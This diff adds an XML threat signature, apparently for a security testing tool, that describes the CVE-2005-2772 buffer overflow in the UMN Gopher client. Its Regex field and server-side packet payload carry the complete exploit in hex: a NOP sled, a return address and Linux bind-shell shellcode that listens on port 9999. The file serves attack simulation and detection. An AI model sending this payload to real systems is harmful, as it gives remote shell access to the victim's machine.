@@ -1,0 +1,90 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="UMN Gopher Client Overflow"/>
+    <EngDesc display="true" value="This threat causes a buffer overflow in the Gopher client application.  This can allow a user to cause remote code execution on the client machine.  Gopher typically listens on port 70.  This threat is a client attack that comes from the virtual server."/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+      <item value="Crashing"/>
+      <item value="Denial_of_Service"/>
+      <item value="Unauthorized_Use"/>
+    </Intent>
+    <Protocol display="true" value="Gopher"/>
+    <Type_Of_Equipment display="true">
+      <item value="Host"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="UMN"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="UMN_Gopher"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="UMN_Gopher_2.3.1"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.fakehalo.us/xgopher-client.c"/>
+    <CVEID display="true" value="CVE-2005-2772"/>
+    <bugtraqID display="true" value="14693"/>
+    <OSVDB display="true" value="19082"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="000001061a2b327000c000a80001003c5c7db3be"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632725926306875000"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="C"/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X2B\X2D\X31\X0A\X2B\X49\X4E\X46\X4F\X3A\X09\X30\X66\X69\X6C\X6C\X65\X72\X09\X66\X69\X6C\X6C\X65\X72\X09\X66\X69\X6C\X6C\X65\X72\X09\X66\X69\X6C\X6C\X65\X72\X0A\X2B\X56\X49\X45\X57\X53\X3A\X09\X0A\X20\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\XEB\X08\XBF\XFF\XE9\X10\X08\X07\X4F\X08\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X90\X31\XC0\X50\X40\X89\XC3\X50\X40\X50\X89\XE1\XB0\X66\XCD\X80\X31\XD2\X52\X66\X68\X27\X0F\X43\X66\X53\X89\XE1\X6A\X10\X51\X50\X89\XE1\XB0\X66\XCD\X80\X40\X89\X44\X24\X04\X43\X43\XB0\X66\XCD\X80\X83\XC4\X0C\X52\X52\X43\XB0\X66\XCD\X80\X93\X89\XD1\XB0\X3F\XCD\X80\X41\X80\XF9\X03\X75\XF6\X52\X68\X6E\X2F\X73\X68\X68\X2F\X2F\X62\X69\X89\XE3\X52\X53\X89\XE1\XB0\X0B\XCD\X80\X0A"/>
+    <Created value="1139462054" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="E"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="F"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="G"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="H"/>
+    <NamedVar name="GopherdestPort" type="ImperfectControls.Port" value="null" index="J"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+      <for index="H"/>
+      <for index="J"/>
+    </for>
+    <for index="C"/>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$GopherdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="C" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="2B2D310A2B494E464F3A093066696C6C65720966696C6C65720966696C6C65720966696C6C65720A2B56494557533A090A20909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090EB08BFFFE91008074F08909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909031C0504089C350405089E1B066CD8031D2526668270F43665389E16A10515089E1B066CD8040894424044343B066CD8083C40C525243B066CD809389D1B03FCD804180F90375F652686E2F7368682F2F626989E3525389E1B00BCD800A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
